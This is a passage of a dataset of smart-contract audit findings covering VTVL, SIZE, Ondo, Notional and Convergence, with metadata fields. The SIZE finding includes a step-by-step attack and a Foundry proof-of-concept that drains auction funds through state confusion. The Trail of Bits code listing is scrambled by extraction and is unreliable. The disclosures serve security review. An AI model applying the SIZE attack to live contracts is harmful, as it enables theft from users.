    await vestingContract.createClaim(owner2.address, startTimestamp, endTimestamp, cliffReleaseTimestamp, releaseIntervalSecs, linearVestAmount, cliffAmount);

    // move clock to termination timestamp (half-way the vesting period plus a bit, but less than release interval seconds)
    await ethers.provider.send(""evm_mine"", [terminationTimestamp]);

    let userBalanceBefore = await tokenContract.balanceOf(owner2.address);
    await (await vestingContract.connect(owner2).withdraw()).wait();
    let userBalanceAfter = await tokenContract.balanceOf(owner2.address);

    // revoke the claim preserving the ""already vested but not yet withdrawn amount""
    await (await vestingContract.revokeClaim(owner2.address)).wait();
    
    // move the clock to the programmed end of vesting period
    await ethers.provider.send(""evm_mine"", [endTimestamp]);

    console.log(userBalanceAfter.sub(userBalanceBefore));
    // RESIGNING EMPLOYEE RECEIVES HIS VESTED AMOUNT BY WITHDRAWING IMMEDIATELY BEFORE RESIGNATION
    expect(userBalanceAfter.sub(userBalanceBefore)).to.be.greaterThan(0);
    expect(await vestingContract.finalClaimableAmount(owner2.address)).to.be.equal(0);
  });
```solidity

## Tools Used

n/a

## Recommended Mitigation Steps

Below are, in order, a test and a diff/patch for a proposed fix. The proposed fix is just an idea at how to fix, or in other words, a way to preserve the already vested amount when claim is revoked.

The diff/patch add a deactivationTimestamp to claim, and a new revokeClaimProper that shall replace the revokeClaim function to correct the behaviour.
The deactivationTimestamp is used to track the deactivation time for the claim in order to preserve the amount vested so far and allow the user to withdraw the amount righteously earned so far. The _baseVestedAmount and hasActiveClaim have been updated to do proper math when isActive is false but deactivationTimestamp is greater than 0.

The finalVestedAmount has been update to show the ""what would be"" amount if the vesting would have reached the claim endTimestamp while the finalClaimableAmount takes into consideration the deactivationTimestamp if the claim has been revoked.

The test shows that the already vested amount (cliff + half way linear vesting) is preserved.

```solidity
diff --git a/contracts/VTVLVesting.sol b/contracts/VTVLVesting.sol
index 133f19f..7ab955c 100644
--- a/contracts/VTVLVesting.sol
+++ b/contracts/VTVLVesting.sol
@@ -34,6 +34,7 @@ contract VTVLVesting is Context, AccessProtected {
         // Gives us a range from 1 Jan 1970 (Unix epoch) up to approximately 35 thousand years from then (2^40 / (365 * 24 * 60 * 60) ~= 35k)
         uint40 startTimestamp; // When does the vesting start (40 bits is enough for TS)
         uint40 endTimestamp; // When does the vesting end - the vesting goes linearly between the start and end timestamps
+        uint40 deactivationTimestamp;
         uint40 cliffReleaseTimestamp; // At which timestamp is the cliffAmount released. This must be <= startTimestamp
         uint40 releaseIntervalSecs; // Every how many seconds does the vested amount increase. 
         
@@ -108,7 +109,7 @@ contract VTVLVesting is Context, AccessProtected {
 
         // We however still need the active check, since (due to the name of the function)
         // we want to only allow active claims
-        require(_claim.isActive == true, ""NO_ACTIVE_CLAIM"");
+        require(_claim.isActive == true || _claim.deactivationTimestamp > 0, ""NO_ACTIVE_CLAIM"");
 
         // Save gas, omit further checks
         // require(_claim.linearVestAmount + _claim.cliffAmount > 0, ""INVALID_VESTED_AMOUNT"");
@@ -144,20 +145,20 @@ contract VTVLVesting is Context, AccessProtected {
     @param _claim The claim in question
     @param _referenceTs Timestamp for which we're calculating
      */
-    function _baseVestedAmount(Claim memory _claim, uint40 _referenceTs) internal pure returns (uint112) {
+    function _baseVestedAmount(Claim memory _claim, uint40 _referenceTs, uint40 vestEndTimestamp) internal pure returns (uint112) {
         uint112 vestAmt = 0;
-        
-        // the condition to have anything vested is to be active
-        if(_claim.isActive) {
+            
+        if(_claim.isActive || _claim.deactivationTimestamp > 0) {
             // no point of looking past the endTimestamp as nothing should vest afterwards
             // So if we're past the end, just get the ref frame back to the end
-            if(_referenceTs > _claim.endTimestamp) {
-                _referenceTs = _claim.endTimestamp;
+            if(_referenceTs > vestEndTimestamp) {
+                _referenceTs = vestEndTimestamp;
             }
 
             // If we're past the cliffReleaseTimestamp, we release the cliffAmount
             // We don't check here that cliffReleaseTimestamp is after the startTimestamp 
-            if(_referenceTs >= _claim.cliffReleaseTimestamp) { // @audit is _claim.require(cliffReleaseTimestamp < _claim.endTimestamp) ?
+            if(_referenceTs >= _claim.cliffReleaseTimestamp) {  // @audit note  cliffReleaseTimestamp cannot? be zero without cliffamoutn being zero
+                // @audit NOTE: (cliffReleaseTimestamp is always <= _startTimestamp <= endTimestamp, or 0 if no vesting)
                 vestAmt += _claim.cliffAmount;
             }
 
@@ -195,7 +196,8 @@ contract VTVLVesting is Context, AccessProtected {
     */
     function vestedAmount(address _recipient, uint40 _referenceTs) public view returns (uint112) {
         Claim storage _claim = claims[_recipient];
-        return _baseVestedAmount(_claim, _referenceTs);
+        uint40 vestEndTimestamp = _claim.isActive ? _claim.endTimestamp : _claim.deactivationTimestamp;
+        return _baseVestedAmount(_claim, _referenceTs, vestEndTimestamp);
     }
 
     /**
@@ -205,7 +207,18 @@ contract VTVLVesting is Context, AccessProtected {
      */
     function finalVestedAmount(address _recipient) public view returns (uint112) {
         Claim storage _claim = claims[_recipient];
-        return _baseVestedAmount(_claim, _claim.endTimestamp);
+        return _baseVestedAmount(_claim, _claim.endTimestamp, _claim.endTimestamp);
+    }
+
+    /**
+    @notice Calculates how much wil be possible to claim at the end of vesting date, by subtracting the already withdrawn
+            amount from the vestedAmount at this moment. Vesting date is either the end timestamp or the deactivation timestamp.
+    @param _recipient - The address for whom we're calculating
+    */
+    function finalClaimableAmount(address _recipient) external view returns (uint112) {
+        Claim storage _claim = claims[_recipient];
+        uint40 vestEndTimestamp = _claim.isActive ? _claim.endTimestamp : _claim.deactivationTimestamp;
+        return _baseVestedAmount(_claim, vestEndTimestamp, vestEndTimestamp) - _claim.amountWithdrawn;
     }
     
     /**
@@ -214,7 +227,8 @@ contract VTVLVesting is Context, AccessProtected {
     */
     function claimableAmount(address _recipient) external view returns (uint112) {
         Claim storage _claim = claims[_recipient];
-        return _baseVestedAmount(_claim, uint40(block.timestamp)) - _claim.amountWithdrawn;
+        uint40 vestEndTimestamp = _claim.isActive ? _claim.endTimestamp : _claim.deactivationTimestamp;
+        return _baseVestedAmount(_claim, uint40(block.timestamp), vestEndTimestamp) - _claim.amountWithdrawn;
     }
     
     /** 
@@ -280,6 +294,7 @@ contract VTVLVesting is Context, AccessProtected {
         Claim memory _claim = Claim({
             startTimestamp: _startTimestamp,
             endTimestamp: _endTimestamp,
+            deactivationTimestamp: 0,
             cliffReleaseTimestamp: _cliffReleaseTimestamp,
             releaseIntervalSecs: _releaseIntervalSecs,
             cliffAmount: _cliffAmount,
@@ -436,6 +451,30 @@ contract VTVLVesting is Context, AccessProtected {
         emit ClaimRevoked(_recipient, amountRemaining, uint40(block.timestamp), _claim);
     }
 
+    function revokeClaimProper(address _recipient) external onlyAdmin hasActiveClaim(_recipient) {
+        // Fetch the claim
+        Claim storage _claim = claims[_recipient];
+        // Calculate what the claim should finally vest to
+        uint112 finalVestAmt = finalVestedAmount(_recipient);
+
+        // No point in revoking something that has been fully consumed
+        // so require that there be unconsumed amount
+        require( _claim.amountWithdrawn < finalVestAmt, ""NO_UNVESTED_AMOUNT"");
+
+        _claim.isActive = false;
+        _claim.deactivationTimestamp = uint40(block.timestamp);
+
+        uint112 vestedSoFarAmt = vestedAmount(_recipient, uint40(block.timestamp));
+        // The amount that is ""reclaimed"" is equal to the total allocation less what was already
+        // vested without the part that was already withdrawn.
+        uint112 amountRemaining = finalVestAmt - (vestedSoFarAmt - _claim.amountWithdrawn);
+
+        numTokensReservedForVesting -= amountRemaining; // Reduces the allocation
+
+        // Tell everyone a claim has been revoked.
+        emit ClaimRevoked(_recipient, amountRemaining, uint40(block.timestamp), _claim);
+    }
+
     /**
     @notice Withdraw a token which isn't controlled by the vesting contract.
     @dev This contract controls/vests token at ""tokenAddress"". However, someone might send a different token. 

```",VTVL,0x52|0xA5DF|Ruhum|rbserver|ElKu|pauliax|TomJ|pedroais|obront|eierina|pcarranzav|0xdapper|RustyRabbit,HIGH,Business Logic,"$30,000 USDC",0,3,5,https://github.com/code-423n4/2022-09-vtvl-findings/issues/475,https://code4rena.com/reports/2022-09-vtvl,,https://code4rena.com/contests/2022-09-vtvl-contest,solodit_reports,d181d3f63faf6ddbdabbe9ac02cca383,2023-09-22 02:42:20,2024-10-14 23:02:32,1,,Dexes|CDP|Services|Cross Chain|Synthetics
731996,137888a013c6b978f9fb1225160065ba,[H-02] Attacker can steal any funds in the contract by state confusion (no preconditions),Code4rena,2022-11-04,"HIGH: Attacker can steal any funds in the contract by state confusion (no preconditions).<br>
LOC:<br>
<https://github.com/code-423n4/2022-11-size/blob/706a77e585d0852eae6ba0dca73dc73eb37f8fb6/src/SizeSealed.sol#L33><br>
<https://github.com/code-423n4/2022-11-size/blob/706a77e585d0852eae6ba0dca73dc73eb37f8fb6/src/SizeSealed.sol#L238>

Auctions in SIZE can be in one of several states, as checked in the atState() modifier:

    modifier atState(Auction storage a, States _state) {
        if (block.timestamp < a.timings.startTimestamp) {
            if (_state != States.Created) revert InvalidState();
        } else if (block.timestamp < a.timings.endTimestamp) {
            if (_state != States.AcceptingBids) revert InvalidState();
        } else if (a.data.lowestQuote != type(uint128).max) {
            if (_state != States.Finalized) revert InvalidState();
        } else if (block.timestamp <= a.timings.endTimestamp + 24 hours) {
            if (_state != States.RevealPeriod) revert InvalidState();
        } else if (block.timestamp > a.timings.endTimestamp + 24 hours) {
            if (_state != States.Voided) revert InvalidState();
        } else {
            revert();
        }
        _;
    }

It's important to note that if current block timestamp is greater than endTimestamp, `a.data.lowestQuote` is used to determine if finalize() was called.

The value is set to max at createAuction.
In finalize, it is set again, using user-controlled input:

    // Last filled bid is the clearing price
    a.data.lowestBase = clearingBase;
    a.data.lowestQuote = clearingQuote;

The issue is that it is possible to break the state machine by calling finalize() and setting lowestQuote to `type(uint128).max`. If the other parameters are crafted correctly, finalize() will succeed and perform transfers of unsold base amount and traded quote amount:

    // Transfer the left over baseToken
    if (data.totalBaseAmount != data.filledBase) {
        uint128 unsoldBase = data.totalBaseAmount - data.filledBase;
        a.params.totalBaseAmount = data.filledBase;
        SafeTransferLib.safeTransfer(ERC20(a.params.baseToken), a.data.seller, unsoldBase);
    }
    // Calculate quote amount based on clearing price
    uint256 filledQuote = FixedPointMathLib.mulDivDown(clearingQuote, data.filledBase, clearingBase);
    SafeTransferLib.safeTransfer(ERC20(a.params.quoteToken), a.data.seller, filledQuote);

Critically, attacker will later be able to call cancelAuction() and cancelBid(), as they are allowed as long as the auction has not finalized:

    function cancelAuction(uint256 auctionId) external {
        Auction storage a = idToAuction[auctionId];
        if (msg.sender != a.data.seller) {
            revert UnauthorizedCaller();
        }
        // Only allow cancellations before finalization
        // Equivalent to atState(idToAuction[auctionId], ~STATE_FINALIZED)
        if (a.data.lowestQuote != type(uint128).max) {
            revert InvalidState();
        }
        // Allowing bidders to cancel bids (withdraw quote)
        // Auction considered forever States.AcceptingBids but nobody can finalize
        a.data.seller = address(0);
        a.timings.endTimestamp = type(uint32).max;
        emit AuctionCancelled(auctionId);
        SafeTransferLib.safeTransfer(ERC20(a.params.baseToken), msg.sender, a.params.totalBaseAmount);
    }

    function cancelBid(uint256 auctionId, uint256 bidIndex)
        external
    {
        Auction storage a = idToAuction[auctionId];
        EncryptedBid storage b = a.bids[bidIndex];
        if (msg.sender != b.sender) {
            revert UnauthorizedCaller();
        }
        // Only allow bid cancellations while not finalized or in the reveal period
        if (block.timestamp >= a.timings.endTimestamp) {
            if (a.data.lowestQuote != type(uint128).max || block.timestamp <= a.timings.endTimestamp + 24 hours) {
                revert InvalidState();
            }
        }
        // Prevent any futher access to this EncryptedBid
        b.sender = address(0);
        // Prevent seller from finalizing a cancelled bid
        b.commitment = 0;
        emit BidCancelled(auctionId, bidIndex);
        SafeTransferLib.safeTransfer(ERC20(a.params.quoteToken), msg.sender, b.quoteAmount);
    }

The attack will look as follows:

1.  attacker uses two contracts - buyer and seller
2.  seller creates an auction, with no vesting period and ends in 1 second. Passes X base tokens.
3.  buyer bids on the auction, using baseAmount=quoteAmount (ratio is 1:1). Passes Y quote tokens, where Y < X.
4.  after 1 second, seller calls reveal() and finalizes, with **lowestQuote = lowestBase = 2&ast;&ast;128-1**.
5.  seller contract receives X-Y unsold base tokens and Y quote tokens
6.  seller calls cancelAuction(). They are sent back remaining totalBaseAmount, which is X - (X-Y) = Y base tokens. They now have the same amount of base tokens they started with. cancelAuction sets endTimestamp = `type(uint32).max`
7.  buyer calls cancelBid. Because endTimestamp is set to max, the call succeeds. Buyer gets back Y quote tokens.
8.  The accounting shows attacker profited Y quote tokens, which are both in buyer and seller's contract.

Note that the values of `minimumBidQuote`, `reserveQuotePerbase` must be carefully chosen to satisfy all the inequality requirements in createAuction(), bid() and finalize(). This is why merely spotting that lowestQuote may be set to max in finalize is not enough and in my opinion, POC-ing the entire flow is necessary for a valid finding.

This was the main constraint to bypass:

    uint256 quotePerBase = FixedPointMathLib.mulDivDown(b.quoteAmount, type(uint128).max, baseAmount);
    ...
    data.previousQuotePerBase = quotePerBase;
    ...
    if (data.previousQuotePerBase != FixedPointMathLib.mulDivDown(clearingQuote, type(uint128).max, clearingBase)) {
                revert InvalidCalldata();
            }

Since clearingQuote must equal UINT128\_MAX, we must satisfy:
(2&ast;&ast;128-1) &ast; (2&ast;&ast;128-1) / clearingBase = quoteAmount &ast; (2&ast;&ast;128-1) / baseAmount. The solution I found was setting clearingBase to (2&ast;&ast;128-1) and quoteAmount = baseAmount.

We also have constraints on reserveQuotePerBase. In createAuction:

    if (
        FixedPointMathLib.mulDivDown(
            auctionParams.minimumBidQuote, type(uint128).max, auctionParams.totalBaseAmount
        ) > auctionParams.reserveQuotePerBase
    ) {
        revert InvalidReserve();
    }

While in finalize():

    // Only fill if above reserve price
    if (quotePerBase < data.reserveQuotePerBase) continue;

And an important constraint on quoteAmount and minimumBidQuote:

    if (quoteAmount == 0 || quoteAmount == type(uint128).max || quoteAmount < a.params.minimumBidQuote) {
        revert InvalidBidAmount();
    }

Merging them gives us two equations to substitute variables in:

1.  `minimumBidQuote / totalBaseAmount < reserveQuotePerBase <= UINT128_MAX / clearingBase`
2.  `quoteAmount > minimumBidQuote`

In the POC I've crafted parameters to steal 2&ast;&ast;30 quote tokens, around 1000 in USDC denomination. With the above equations, increasing or decreasing the stolen amount is simple.

### Impact

An attacker can steal all tokens held in the SIZE auction contract.

### Proof of Concept

Copy the following code in SizeSealed.t.sol

    function testAttack() public {
        quoteToken = new MockERC20(""USD Coin"", ""USDC"", 6);
        baseToken = new MockERC20(""DAI stablecoin "", ""DAI"", 18);
        // Bootstrap auction contract with some funds
        baseToken.mint(address(auction), 1e20);
        quoteToken.mint(address(auction), 1e12);
        // Create attacker
        MockSeller attacker_seller  = new MockSeller(address(auction), quoteToken, baseToken);
        MockBuyer attacker_buyer = new MockBuyer(address(auction), quoteToken, baseToken);
        // Print attacker balances
        uint256 balance_quote;
        uint256 balance_base;
        (balance_quote, balance_base) = attacker_seller.balances();
        console.log(""Starting seller balance: "", balance_quote, balance_base);
        (balance_quote, balance_base) = attacker_buyer.balances();
        console.log('Starting buyer balance: ', balance_quote, balance_base);
        // Create auction
        uint256 auction_id = attacker_seller.createAuction(
            2**32,  // totalBaseAmount
            2**120, // reserveQuotePerBase
            2**20, // minimumBidQuote
            uint32(block.timestamp), // startTimestamp
            uint32(block.timestamp + 1),  // endTimestamp
            uint32(block.timestamp + 1), // vestingStartTimestamp
            uint32(block.timestamp + 1), // vestingEndTimestamp
            0 // cliffPercent
        );
        // Bid on auction
        attacker_buyer.setAuctionId(auction_id);
        attacker_buyer.bidOnAuction(
            2**30, // baseAmount
            2**30  // quoteAmount
        );
        // Finalize with clearingQuote = clearingBase = 2**128-1
        // Will transfer unsold base amount + matched quote amount
        uint256[] memory bidIndices = new uint[](1);
        bidIndices[0] = 0;
        vm.warp(block.timestamp + 10);
        attacker_seller.finalize(bidIndices, 2**128-1, 2**128-1);
        // Cancel auction
        // Will transfer back sold base amount
        attacker_seller.cancelAuction();
        // Cancel bid
        // Will transfer back to buyer quoteAmount
        attacker_buyer.cancel();
        // Net profit of quoteAmount tokens of quoteToken
        (balance_quote, balance_base) = attacker_seller.balances();
        console.log(""End seller balance: "", balance_quote, balance_base);
        (balance_quote, balance_base) = attacker_buyer.balances();
        console.log('End buyer balance: ', balance_quote, balance_base);
    }

### Tools Used

Manual audit, foundry tests

### Recommended Mitigation Steps

Do not trust the value of `lowestQuote` when determining the finalize state, use a dedicated state variable for it.


**[RagePit (SIZE) confirmed](https://github.com/code-423n4/2022-11-size-findings/issues/252#issuecomment-1316061426)**


***",SIZE,PwnedNoMore|hansfriese|bin2chen|8olidity|R2|Picodes|cryptphi|V_B|cryptonue|Trust|KIntern_NA|KingNFT|fs0c|M4TZ1P|HE1M|JTJabba,HIGH,Wrong Math,"$42,500 USDC",0,3,5,https://github.com/code-423n4/2022-11-size-findings/issues/252,https://code4rena.com/reports/2022-11-size,,https://code4rena.com/contests/2022-11-size-contest,solodit_reports,bab2dc5237627a8d2045e9ddca5d7c39,2023-09-22 02:42:52,2024-10-14 23:08:52,1,"} else if (a.data.lowestQuote != type(uint128).max) {
```
        a.data.lowestQuote = clearingQuote;",Services|Yield Aggregator|Staking Pool
732155,e5a8ecf9def4e857c9c3dfb2f15b3e99,Risk of accounting errors due to missing check in the invest function,TrailOfBits,2022-11-18,"Diﬃculty: Low

Type: Data Validation

Description
Because of a missing check in the invest function, investing multiple tokens with diﬀerent
decimals in the same strategy will result in incorrect proﬁt-and-loss (PnL) reporting, which
could result in the loss of user or protocol funds.
The invest function is responsible for transferring funds from the treasury to a strategy
and for updating the strategy’s investment balance (i.e., strategyInvestedAmount).
However, the invest function accepts any token in the collateral array alongside the
token amounts to be transferred. Therefore, if multiple tokens with diﬀerent decimals are
used to invest in the same strategy, the treasury’s investment records would not accurately
reﬂect the true balance of the strategy, resulting in accounting errors within the protocol.
IERC20 collateralToken = collateral[collateralIndex].collateralToken;
require(
function invest(
address strategy,
uint256 collateralAmount,
uint256 collateralIndex
address(collateralToken) != address(0),
""Treasury: Cannot used a removed collateral token""
);
// Require that the strategy address is approved
require(
694
695
696
697
698    ) external whenNotPaused whenTreasuryActive onlyFundManager {
699
700
701
702
703
704
705
706
707
708
709
710
711
712
713
714
715
716
717
hasRole(strategy, Roles.STRATEGY_CONTRACT),
""Treasury: Must send funds to approved strategy contract""
// Transfer collateral to strategy
collateralToken.safeTransfer(strategy, collateralAmount);
// Account for investment in strategyInvestedAmounts
strategyInvestedAmounts[strategy] += collateralAmount;
// Scale up invested amount
investedAmount += _scaleUp(collateralAmount, collateralIndex);
);
Figure 2.1: The invest function in Treasury.sol#L694–719
Exploit Scenario
The CompoundStrategy contract is supposed to accept only USDC as its investment token.
However, the fund manager, Bob, triggers investments into the Compound strategy using
FRAX tokens instead. Due to insuﬃcient validation of the collateralToken value, the
transaction succeeds, causing a mismatch between the treasury’s account and the total
value of assets in the strategy.
Recommendations
Short term, implement a check within the invest function to ensure that the
collateralToken address of the supplied collateralIndex value matches the token
accepted by the strategy.
Long term, carefully review token usage across all contracts to ensure that each token’s
decimal places are taken into consideration.",Ondo Finance: Ondo Protocol,Damilola Edwards|Justin Jacob|Anish Naik,HIGH,,,26,0,0,,https://github.com/trailofbits/publications/blob/master/reviews/2022-10-shimacapital-ondo-securityreview.pdf,https://solodit-bucket.s3.amazonaws.com/storage/reports/trailofbits/2022-10-shimacapital-ondo-securityreview.pdf,https://github.com/trailofbits/publications/blob/master/reviews/2022-10-shimacapital-ondo-securityreview.pdf,solodit_reports,d831bb8e3a61f919269326479b2c2251,2023-09-22 02:43:06,2024-10-14 23:12:01,1,,
732741,9d7964c51104fa9f7354928e8beb4b16,H-6: `msgValue` will not be populated if ETH is the secondary token,Sherlock,2023-01-09,"# Issue H-6: `msgValue` will not be populated if ETH is the secondary token 

Source: https://github.com/sherlock-audit/2022-12-notional-judging/issues/12 

## Found by 
xiaoming90

## Summary

`msgValue` will not be populated if ETH is the secondary token in the two token leverage vault, leading to a loss of assets as the ETH is not forwarded to the Balancer Pool during a trade.

## Vulnerability Detail

Based on the source code of the two token pool leverage vault, it is possible to deploy a vault to support a Balancer pool with an arbitrary token as the primary token and ETH as the secondary token. The primary token is always the borrowing currency in the vault.

However, Line 60 of `TwoTokenPoolUtils._getPoolParams` function below assumes that if one of the two tokens is ETH in the pool, it will always be the primary token or borrowing currency, which is not always the case. If the ETH is set as the secondary token, the `msgValue` will not be populated.

https://github.com/sherlock-audit/2022-12-notional/blob/main/contracts/vaults/balancer/internal/pool/TwoTokenPoolUtils.sol#L45

```solidity
File: TwoTokenPoolUtils.sol
44:     /// @notice Returns parameters for joining and exiting Balancer pools
45:     function _getPoolParams(
46:         TwoTokenPoolContext memory context,
47:         uint256 primaryAmount,
48:         uint256 secondaryAmount,
49:         bool isJoin
50:     ) internal pure returns (PoolParams memory) {
51:         IAsset[] memory assets = new IAsset[](2);
52:         assets[context.primaryIndex] = IAsset(context.primaryToken);
53:         assets[context.secondaryIndex] = IAsset(context.secondaryToken);
54: 
55:         uint256[] memory amounts = new uint256[](2);
56:         amounts[context.primaryIndex] = primaryAmount;
57:         amounts[context.secondaryIndex] = secondaryAmount;
58: 
59:         uint256 msgValue;
60:         if (isJoin && assets[context.primaryIndex] == IAsset(Deployments.ETH_ADDRESS)) {
61:             msgValue = amounts[context.primaryIndex];
62:         }
63: 
64:         return PoolParams(assets, amounts, msgValue);
65:     }
```

As a result, when the caller joins the Balancer pool, the `params.msgValue` will be empty, and no secondary token (ETH) will be forwarded to the Balancer pool. The ETH will remain stuck in the vault and the caller will receive much fewer BPT tokens in return.

https://github.com/sherlock-audit/2022-12-notional/blob/main/contracts/vaults/balancer/internal/pool/BalancerUtils.sol#L49

```solidity
File: BalancerUtils.sol
48:     /// @notice Joins a balancer pool using exact tokens in
49:     function _joinPoolExactTokensIn(
50:         PoolContext memory context,
51:         PoolParams memory params,
52:         uint256 minBPT
53:     ) internal returns (uint256 bptAmount) {
54:         bptAmount = IERC20(address(context.pool)).balanceOf(address(this));
55:         Deployments.BALANCER_VAULT.joinPool{value: params.msgValue}(
56:             context.poolId,
57:             address(this),
58:             address(this),
59:             IBalancerVault.JoinPoolRequest(
60:                 params.assets,
61:                 params.amounts,
62:                 abi.encode(
63:                     IBalancerVault.JoinKind.EXACT_TOKENS_IN_FOR_BPT_OUT,
64:                     params.amounts,
65:                     minBPT // Apply minBPT to prevent front running
66:                 ),
67:                 false // Don't use internal balances
68:             )
69:         );
70:         bptAmount =
71:             IERC20(address(context.pool)).balanceOf(address(this)) -
72:             bptAmount;
73:     }
```

## Impact

Loss of assets for the callers as ETH will remain stuck in the vault and not forwarded to the Balancer Pool. Since the secondary token (ETH) is not forwarded to the Balancer pool, the caller will receive much fewer BPT tokens in return when joining the pool.

This issue affects the deposit and reinvest reward functions of the vault, which means that the depositor will receive fewer strategy tokens in return during depositing, and the vault will receive less BPT in return during reinvesting.

## Code Snippet

https://github.com/sherlock-audit/2022-12-notional/blob/main/contracts/vaults/balancer/internal/pool/TwoTokenPoolUtils.sol#L45

## Tool used

Manual Review

## Recommendation

Consider populating the `msgValue` if the secondary token is ETH.

```diff
/// @notice Returns parameters for joining and exiting Balancer pools
function _getPoolParams(
    TwoTokenPoolContext memory context,
    uint256 primaryAmount,
    uint256 secondaryAmount,
    bool isJoin
) internal pure returns (PoolParams memory) {
    IAsset[] memory assets = new IAsset[](2);
    assets[context.primaryIndex] = IAsset(context.primaryToken);
    assets[context.secondaryIndex] = IAsset(context.secondaryToken);

    uint256[] memory amounts = new uint256[](2);
    amounts[context.primaryIndex] = primaryAmount;
    amounts[context.secondaryIndex] = secondaryAmount;

    uint256 msgValue;
    if (isJoin && assets[context.primaryIndex] == IAsset(Deployments.ETH_ADDRESS)) {
    	msgValue = amounts[context.primaryIndex];
    }
+   if (isJoin && assets[context.secondaryIndex] == IAsset(Deployments.ETH_ADDRESS)) {
+   	msgValue = amounts[context.secondaryIndex];
+   }
    
    return PoolParams(assets, amounts, msgValue);
}
```

## Discussion

**weitianjie2000**

valid, will fix",Notional Update,xiaoming90,HIGH,,25000 USDC,0,0,0,https://github.com/sherlock-audit/2022-12-notional-judging/issues/12,,,https://app.sherlock.xyz/audits/contests/31,solodit_reports,,2023-09-22 02:43:57,2024-10-14 23:27:28,1,,Dexes|CDP|Services|Cross Chain
734084,e90c0958778e301d17031b4fedbecd76,MERKLE TREE INVESTMENT LIMIT CAN BE BYPASSED,Halborn,2023-06-09,"Description: The WlPresaleCvg contract allows users to buy CVG tokens if they are whitelisted in a Merkle tree. Currently, there are 3 Merkle trees, each one with a different investment limit: •Small with a maximum of 800 * 10e18 CVG tokens. •Medium with a maximum of 4,000 * 10e18 CVG tokens. •Large with a maximum of 8,000 * 10e18 CVG tokens. Users invest by sending the amount to invest, Merkle proof and the type of Merkle tree to the investMint function. This function checks that the amount is below the list type limit and mints a position NFT to the user. Moreover, the refillToken function allows users to refill a position NFT as long as the new total amount does not exceed the Merkle type limit. However, although this function properly increases the cvgRedeemable variable, it does not properly increase the stableInvested amount used to determine whether an investment has exceeded the limit. This allows a malicious user to invest the minimum amount required in order to create a position NFT and later call refillToken multiple times, allowing them to retrieve the whole CVG Tokens, not only bypassing their Merkle tree limits but also leaving other users in the Merkle trees without any tokens. 21 FINDINGS & TECH DETAILS Code Location: Listing 1: contracts/PresaleVesting/WlPresaleCvg.sol232 function refillToken ( 233 uint256 _tokenId , 234 uint256 _amount , 235 bool _isDai 236 )external { 237 require (ownerOf (_tokenId ) == msg.sender ,""NOT_OWNED ""); 238 239 IERC20 token =_isDai ?Dai :Frax ; 240 241 uint256 _vestingType =presaleInfos [_tokenId ].vestingType ; 242 uint256 cvgAmount = (_amount *NUMERATOR ) / PRICE_WL ; 243 244 wlParams [_vestingType ].cvgRedeemable +=cvgAmount ; 245 246 require ( 247 _amount +presaleInfos [_tokenId ].stableInvested <= 248 wlParams [_vestingType ].maxInvest , 249 ""TOO_MUCH_Q_WL "" 250 ); 251 252 ///@dev update the presales info for this address ,only ëchange cvgAmount 253 presaleInfos [_tokenId ].cvgAmount +=cvgAmount ; 254 255 ///@dev Update available supply 256 supply -=cvgAmount ; 257 258 ///@dev Transfer 259 token .transferFrom (msg.sender ,address (this ),_amount ); 260 } BVSS: AO:A/AC:L/AX:L/C:N/I:C/A:C/D:N/Y:C/R:N/S:U (10) 22 FINDINGS & TECH DETAILS Proof of Concept: 1.A malicious user calls investMint ()to create a new position. 2.Malicious users call refillToken ()multiple times, bypassing the Merkle tree limit and ending with all CVG Token supply. 3.Now, legitimate users can no longer receive their CVG tokens. Recommendation: It is recommended to increase the stableInvested variable in the refillToken function.",Convergence Finance - Convergence Protocol  Security Assessment,Halborn,HIGH,,,22,0,0,,https://github.com/HalbornSecurity/PublicReports/blob/master/Solidity Smart Contract Audits/Convergence_Finance_Convergence_Protocol_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf,https://solodit-bucket.s3.amazonaws.com/storage/reports/halborn/Convergence_Finance_Convergence_Protocol_Smart_Contract_Security_Assessment_Report_Halbo.pdf,https://github.com/HalbornSecurity/PublicReports/blob/master/Solidity Smart Contract Audits/Convergence_Finance_Convergence_Protocol_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf,solodit_reports,31f8d0b116e197b941fe282dda224aa0,2023-09-22 02:45:51,2024-10-14 23:53:49,1,,
734085,019e61521eb220844c644a4d5869cbf6,REVOKED SCHEDULES CAN BE USED TO RELEASE CVG,Halborn,2023-06-09,"Description: In the VestingCvg contract, the revokeVestingSchedule function allows revoking an existing vesting schedule. This function reduces the vestingSchedulesTotalAmount by the amount of CVG pending release. However, when releasing the CVG with any of the available functions (releaseSeed ,releaseWl orreleaseTeamOrDao ) the last vesting sched- ule is retrieved without checking the revoked variable. Even if a new schedule is introduced, if a user calls any of the release functions while the current schedule is revoked, the user can release CVG tokens with the revoked schedule and the released amount is deducted from the vestingSchedulesTotalAmount , causing an underflow for other legitimate user when they are trying to release their tokens. 24 FINDINGS & TECH DETAILS Code Location: Listing 2: contracts/PresaleVesting/VestingCvg.sol238 function releaseSeed (uint256 _tokenId )external onlyOwnerOfSeed ( ë_tokenId ) { 239 ( 240 uint256 amountToRelease , 241 , 242 , 243 uint256 vestingScheduleId 244 ) = _computeReleaseAmount (_tokenId ,true ); 245 require (amountToRelease > 0, ""NOT_RELEASABLE "");//@audit Not ëchecking ifrevoked . 246 247 //update totalReleased &amountReleasedId & ëvestingSchedulesTotalAmount 248 vestingSchedules [vestingScheduleId ].totalReleased += ëamountToRelease ; 249 250 amountReleasedIdSeed [_tokenId ] += amountToRelease ; 251 252 vestingSchedulesTotalAmount -=amountToRelease ; 253 254 //transfer Cvg amount torelease 255 cvg.transfer (msg.sender ,amountToRelease ); 256 } BVSS: AO:A/AC:L/AX:L/C:N/I:N/A:N/D:N/Y:C/R:N/S:U (10) 25 FINDINGS & TECH DETAILS Proof of Concept: 1.An existing vesting schedule is revoked by the administrator. 2.A user with that vesting schedule assigned releases his vested CVG. 3.Vesting schedule gets executed even if it is revoked. 4.When the total released amount approaches the limit, the release functions will underflow for other legitimate users. Recommendation: It is recommended to implement a check to prevent users from releasing CVG if their assigned schedule has been revoked.",Convergence Finance - Convergence Protocol  Security Assessment,Halborn,HIGH,,,25,0,0,,https://github.com/HalbornSecurity/PublicReports/blob/master/Solidity Smart Contract Audits/Convergence_Finance_Convergence_Protocol_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf,https://solodit-bucket.s3.amazonaws.com/storage/reports/halborn/Convergence_Finance_Convergence_Protocol_Smart_Contract_Security_Assessment_Report_Halbo.pdf,https://github.com/HalbornSecurity/PublicReports/blob/master/Solidity Smart Contract 